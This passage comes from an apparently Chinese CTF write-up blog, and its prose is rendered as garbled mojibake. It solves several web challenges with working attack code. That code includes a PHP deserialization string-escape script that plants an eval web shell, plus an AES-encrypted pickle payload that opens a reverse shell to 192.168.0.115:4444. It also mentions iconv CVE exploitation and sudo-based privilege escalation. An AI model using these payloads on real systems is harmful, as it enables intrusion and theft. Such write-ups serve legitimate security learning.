class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;data.php&#x27;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$regexResult</span> = <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^A-Za-z0-9_]/&#x27;</span>, <span class="hljs-variable">$id</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$regexResult</span> === <span class="hljs-literal">false</span> || <span class="hljs-variable">$regexResult</span> === <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Illegal character detected&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$id</span>) &gt; <span class="hljs-number">100</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Is this your id?&#x27;</span>);<br>&#125;<br><span class="hljs-comment">// check if file exists</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;books/&#x27;</span> . <span class="hljs-variable">$id</span> . <span class="hljs-string">&#x27;.info&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Book not found&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;books/&#x27;</span> . <span class="hljs-variable">$id</span> . <span class="hljs-string">&#x27;.info&#x27;</span>);<br><span class="hljs-variable">$book</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$content</span>);<br><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$book</span> <span class="hljs-keyword">instanceof</span> Book) || !(<span class="hljs-variable">$book</span>-&gt;reader <span class="hljs-keyword">instanceof</span> Reader)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;Invalid data&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br><br>    <span class="hljs-variable">$book</span>-&gt;title = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>    <span class="hljs-variable">$book</span>-&gt;author = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;author&#x27;</span>];<br>    <span class="hljs-variable">$book</span>-&gt;summary = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;summary&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;books/&#x27;</span> . <span class="hljs-variable">$book</span>-&gt;id . <span class="hljs-string">&#x27;.info&#x27;</span>, <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$book</span>)));<br>    <span class="hljs-variable">$book</span>-&gt;reader-&gt;<span class="hljs-title function_ invoke__">setContent</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\\&#x27;&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;common/header.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„bookä½¿ç”¨serializeæ¥å­˜å‚¨çš„ï¼Œè™½ç„¶wafä¼šæ›¿æ¢<code>â€˜</code>ä¸º<code>\&#39;</code>ï¼Œè¿™é‡Œå…¶å®å°±å¯¼è‡´äº†phpååºåˆ—åŒ–ä¸­çš„å­—ç¬¦ä¸²é€ƒé€¸ï¼Œé€šè¿‡è¿™ç§é€ƒé€¸æˆ‘ä»¬å¯ä»¥æ’å…¥æƒ³è¦çš„payloadã€‚</p><p>è¿™é‡Œæ˜¾ç„¶æˆ‘ä»¬å¯ä»¥é€ƒé€¸æ‰ <code>Reader</code> ä¸­çš„è·¯å¾„, ä»è€Œä½¿å…¶èƒ½å¤Ÿå˜æˆä»»æ„è·¯å¾„ï¼š</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119004704065.png" alt="image-20250119004704065"></p><p>åœ¨ <code>update.php</code> ä¸­æœ‰ <code>file_put_contents</code> å‡½æ•°ã€‚<code>file_put_contents</code> å¯ä»¥å°†æ•°æ®å†™å…¥æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</p><p>å­—ç¬¦ä¸²é€ƒé€¸è°ƒè¯•ï¼šï¼ˆæŠ„ä¸€æ‰‹å®˜æ–¹çš„ï¼Œæ‡’å¾—å†™äº†wwwï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Book</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$title</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$author</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$summary</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$reader</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reader</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$location</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;location = <span class="hljs-variable">$location</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLocation</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;location;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$location</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getContent</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;location);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setContent</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;location, <span class="hljs-variable">$content</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$book</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>();<br><span class="hljs-variable">$book</span>-&gt;id = <span class="hljs-string">&#x27;kengwang_aura&#x27;</span>;<br><span class="hljs-variable">$book</span>-&gt;title = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-variable">$book</span>-&gt;author = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-variable">$partA</span> = <span class="hljs-string">&#x27;&quot;;s:6:&quot;reader&quot;;O:6:&quot;Reader&quot;:1:&#123;s:16:&quot;&#x27;</span>;<br><span class="hljs-variable">$partB</span> = <span class="hljs-string">&#x27;Reader&#x27;</span>;<br><span class="hljs-variable">$partC</span> = <span class="hljs-string">&#x27;location&quot;;s:14:&quot;books/shel.php&quot;;&#125;&#125;;&#x27;</span>;<br><span class="hljs-variable">$payload</span> =  <span class="hljs-variable">$partA</span> . <span class="hljs-string">&quot;\x00&quot;</span> . <span class="hljs-variable">$partB</span> . <span class="hljs-string">&quot;\x00&quot;</span> . <span class="hljs-variable">$partC</span>;<br><span class="hljs-variable">$length</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$partA</span>) + <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$partB</span>) + <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$partC</span>) + <span class="hljs-number">2</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Payload length: &quot;</span> . <span class="hljs-variable">$length</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$book</span>-&gt;summary = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-variable">$length</span>) . <span class="hljs-variable">$payload</span>;<br><span class="hljs-variable">$book</span>-&gt;reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reader</span>(<span class="hljs-string">&#x27;books/&#x27;</span> . <span class="hljs-string">&#x27;abc&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\\&#x27;&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Summary: &quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$book</span>-&gt;summary);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$book</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n[+] Serialized payload: &quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$newBook</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Location: &quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$newBook</span>-&gt;reader-&gt;<span class="hljs-title function_ invoke__">getLocation</span>();<br></code></pre></td></tr></table></figure><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119010623597.png" alt="image-20250119010623597"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒè¯•å‡ºçš„locationå·²ç»æˆä¸ºäº†books&#x2F;shel.phpï¼Œå¯ä»¥ä»»æ„è·¯å¾„å†™å…¥äº†ã€‚</p><p>æ³¨æ„è¿™é‡Œçš„ <code>private</code> å…¶å®æˆ‘ä»¬å¯ä»¥ä¸ç”¨å°è£…åˆ° <code>\x00</code> é‡Œé¢çš„ (7.2+), ä¸ºäº†ä¿é™©è¿˜æ˜¯è¿™ä¹ˆå†™äº†ã€‚</p><p>æˆ‘ä»¬è®¿é—® <code>update.php</code> å°†å†…å®¹contentæ”¹ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119013523131.png" alt="image-20250119013523131"></p><p>ä½†æ˜¯è¿™é‡Œå¥½åƒæ²¡å†™è¿›å»ï¼Œéœ€è¦æˆ‘ä»¬å†è§¦å‘ä¸€æ¬¡ååºåˆ—åŒ–ï¼Œæ‰€ä»¥åœ¨é¡µé¢å†™ä¸€æ¬¡ï¼š</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119013602711.png" alt="image-20250119013602711"></p><p>ç„¶åå°±å¯ä»¥ä¸Šèšå‰‘äº†ã€‚</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119013655870.png" alt="image-20250119013655870"></p><p>éš¾ç»·çš„æ˜¯ç»™ä½ ä¸Šäº†èšå‰‘æ’ä»¶ä¸èƒ½ç»•çš„<code>disable_functions</code>ï¼Œé™äº†open_basedirï¼Œè™½ç„¶è¿™ä¸ªä¹Ÿå¯ä»¥ç”¨mkdirå’Œchdirç»•ï¼Œä½†æ˜¯æ²¡å•¥æ•ˆæœå…¶å®ï¼Œå› ä¸ºRä¸äº†ã€‚</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119014202910.png" alt="image-20250119014202910"></p><p>è¿™é‡Œåˆç”¨äº†ä¸€ä¸ªæ€ªæ‹›ï¼Œå…¶å®æˆ‘ä¹‹å‰ä¹Ÿçœ‹åˆ°è¿‡ï¼Œç”¨iconvé‚£ä¸ªæ´(CVE-2024-2961)å»æ‰“ï¼Œè¿™å‡ºé¢˜äººçº¯ç¼åˆbã€‚ã€‚ã€‚</p><p>è¿™æ˜¯æˆ‘åœ¨SCTFæ˜Ÿç›Ÿå®‰å…¨wpé‡Œçœ‹åˆ°çš„æ‰‹æ®µï¼Œè·³æ¿php+iconvã€‚</p><p>æŒ‰ç…§ä¸Šé¢çš„æ–¹æ³•é‡æ–°æ·»åŠ ä¸€æœ¬ä¹¦ï¼Œå†æŠŠè¿™ä¸ªå†™è¿›å»å°±å¯ä»¥äº†ã€‚</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119015523513.png" alt="image-20250119015523513"></p><p>ä½†æ˜¯ä½ è¿˜æ˜¯æ²¡æƒé™è¯»flagï¼Œå¿…é¡»å¼¹ä¸ªshellææƒã€‚</p><p>ç„¶è€Œè¿™ä¸ªæŠ½è±¡ç¯å¢ƒç»å¸¸å¼¹ä¸è¿›å»shellï¼Œç”¨è‡ªåŠ¨æŒ¡åŸæœ¬çš„åˆä¼šçˆ†ç¨€å¥‡å¤æ€ªçš„é”™ï¼Œç”šè‡³è¿˜æœ‰æŠŠé¶æœºæ‰“å´©çš„æƒ…å†µï¼ŒæŠ½è±¡å®Œäº†ã€‚ã€‚ã€‚ã€‚</p><p>è¿˜æ˜¯ç”¨æ‰‹åŠ¨æŒ¡çš„å§ï¼ŒæŠŠmapså’Œlibcå¯¼ä¸‹æ¥ï¼Œbashä¹Ÿå¼¹ä¸äº†ï¼Œcurlå¼¹çš„ã€‚ä¼°è®¡æœ‰ç‚¹ä»€ä¹ˆç¼–ç é—®é¢˜ã€‚</p><p>suidææƒå¯è§dateå¯ç”¨ä¸”nopasswdï¼š</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119022246964.png" alt="image-20250119022246964"></p><p>ç›´æ¥è¯»å§ï¼š</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/34515a72b254ebcddb1772d74b503c4c.png" alt="img"></p><p>æ‰“ç“¦æ‰“å®Œå¤ç°çš„ï¼Œå›°äº†ï¼Œç¡è§‰zzz</p><hr><h2 id="day3-easy-code"><a href="#day3-easy-code" class="headerlink" title="day3-easy_code"></a>day3-easy_code</h2><p>è¿˜æ˜¯æ”¾ç¬¬ä¸‰å¤©äº†ã€‚</p><p>å‚»é€¼ç»•è¿‡é¢˜ï¼Œæ‡’å¾—å–·ã€‚</p><p>æ•´æ•°æº¢å‡ºç›´æ¥ç”¨</p><p>6.669999999999999â€¦9999e2ç»•</p><p>ä¼ªåè®®æ²¡banæ‰iconv-utfç±»ï¼Œç›´æ¥æ‰“äº†ï¼š</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250120132917485.png" alt="image-20250120132917485"></p><p>base64è½¬ä¸€ä¸‹å°±æ˜¯flagã€‚</p><h2 id="day3-phar"><a href="#day3-phar" class="headerlink" title="day3-phar"></a>day3-phar</h2><p>å«å•¥æˆ‘ä¹Ÿå¿˜äº†ï¼Œå‡ºçš„åŸé¢˜ï¼Œçƒ‚å®Œäº†ã€‚</p><p>å¤šçš„ä¸è¯´ç›´æ¥æ‰“äº†ï¼š</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250120133105102.png" alt="image-20250120133105102"></p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250120133024084.png" alt="image-20250120133024084"></p><h2 id="day3-ezUpload"><a href="#day3-ezUpload" class="headerlink" title="day3-ezUpload"></a>day3-ezUpload</h2><p>ä¹Ÿæ˜¯ä¸ªå”é¢˜ã€‚</p><p>æ‰«æè·¯ç”±åå‘ç°å­˜åœ¨hintè·¯ç”±ï¼Œè·å–åˆ°å†…å®¹VXBMT2FkX2VuY3I3UHQzZA&#x3D;&#x3D;ï¼ŒBASE64è§£å¯†åå¾—åˆ°å†…å®¹UpLOad_encr7Pt3dï¼Œè¿˜å¾—çŒœè¿™ä¸ªæ˜¯keyï¼Œä½ è¯´æ˜¯ä¸æ˜¯å”é¢˜ã€‚</p><p>è¿˜è¦çŒœAES-CBCçš„åŠ å¯†æ–¹å¼ï¼Œç„¶åfuzzä¸Šä¼ çŒœä»€ä¹ˆè¢«wafäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;i&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;b&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;o&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;curl&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;system&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27; &#x27;</span> <span class="hljs-keyword">in</span> data:<br></code></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯ä¸ªæ‰“pickleã€‚unicodeç›´æ¥å°±ç»•äº†:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_data</span>(<span class="hljs-params">data</span>):<br>    key = <span class="hljs-string">b&#x27;UpLOad_encr7Pt3d&#x27;</span><br>    cipher = AES.new(key, AES.MODE_ECB)<br>    padded_data = pad(data, AES.block_size)<br>    encrypted_data = cipher.encrypt(padded_data)<br>    <span class="hljs-keyword">return</span> base64.b64encode(encrypted_data).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;&#x27;&#x27;V__\u0062u\u0069lt\u0069n__</span><br><span class="hljs-string">Vmap</span><br><span class="hljs-string">\x93p0</span><br><span class="hljs-string">0(]V\u0069mp\u006Frt\u0020s\u006Fcket,su\u0062pr\u006Fcess,\u006Fs;s=s\u006Fcket.s\u006Fcket(s\u006Fcket.AF_INET,s\u006Fcket.SOCK_ST\u0052EAM);s.c\u006Fnnect((&quot;192.168.0.115&quot;,4444));\u006Fs.dup2(s.f\u0069len\u006F(),0);\u006Fs.dup2(s.f\u0069len\u006F(),1);\u006Fs.dup2(s.f\u0069len\u006F(),2);p=su\u0062pr\u006Fcess.call([&quot;/\u0062\u0069n/sh&quot;,&quot;-\u0069&quot;]);</span><br><span class="hljs-string">ap1</span><br><span class="hljs-string">0((V__\u0062u\u0069lt\u0069n__</span><br><span class="hljs-string">Vexec</span><br><span class="hljs-string">\x93g1</span><br><span class="hljs-string">tp2</span><br><span class="hljs-string">0(g0</span><br><span class="hljs-string">g2</span><br><span class="hljs-string">\x81tp3</span><br><span class="hljs-string">0V__\u0062u\u0069lt\u0069n__</span><br><span class="hljs-string">V\u0062ytes</span><br><span class="hljs-string">\x93p4</span><br><span class="hljs-string">g3</span><br><span class="hljs-string">\x81.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(encrypt_data(payload))<br></code></pre></td></tr></table></figure><p>æ”¾txté‡Œï¼Œä¸Šä¼ æ–‡ä»¶è§£å¯†åå¼¹shellã€‚</p><h2 id="day3-flagBot"><a href="#day3-flagBot" class="headerlink" title="day3-flagBot"></a>day3-flagBot</h2><p>è¿™ä¸ªä¸æ”¾AIä¸æ”¾miscæ”¾webã€‚ã€‚ã€‚</p><p>æ€è·¯å…¶å®å°±æ˜¯å®ƒæç¤ºçš„é‚£æ ·</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">é€šè¿‡ä¿®æ”¹å‘é€çš„æ•°æ®åŒ…ï¼Œå¯¼è‡´flaskæŠ¥é”™ï¼Œå¾—åˆ°æ¨¡å‹æ–‡ä»¶å<br>ä¸‹è½½æ¨¡å‹æ–‡ä»¶<br>ä½¿ç”¨å¾—åˆ°çš„æ¨¡å‹æ–‡ä»¶ï¼Œä»¥åŠæ–‡ä»¶åï¼Œåˆ¶ä½œå¯¹æŠ—æ ·æœ¬<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> werkzeug.exceptions<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AlexNet</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, num_classes: <span class="hljs-built_in">int</span> = <span class="hljs-number">1000</span>, dropout: <span class="hljs-built_in">float</span> = <span class="hljs-number">0.5</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">super</span>().__init__()<br>        <span class="hljs-variable language_">self</span>.features = nn.Sequential(<br>            nn.Conv2d(<span class="hljs-number">3</span>, <span class="hljs-number">64</span>, kernel_size=<span class="hljs-number">11</span>, stride=<span class="hljs-number">4</span>, padding=<span class="hljs-number">2</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.MaxPool2d(kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">2</span>),<br>            nn.Conv2d(<span class="hljs-number">64</span>, <span class="hljs-number">192</span>, kernel_size=<span class="hljs-number">5</span>, padding=<span class="hljs-number">2</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.MaxPool2d(kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">2</span>),<br>            nn.Conv2d(<span class="hljs-number">192</span>, <span class="hljs-number">384</span>, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.Conv2d(<span class="hljs-number">384</span>, <span class="hljs-number">256</span>, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.Conv2d(<span class="hljs-number">256</span>, <span class="hljs-number">256</span>, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>),<br>            nn.ReLU(inplace=<span 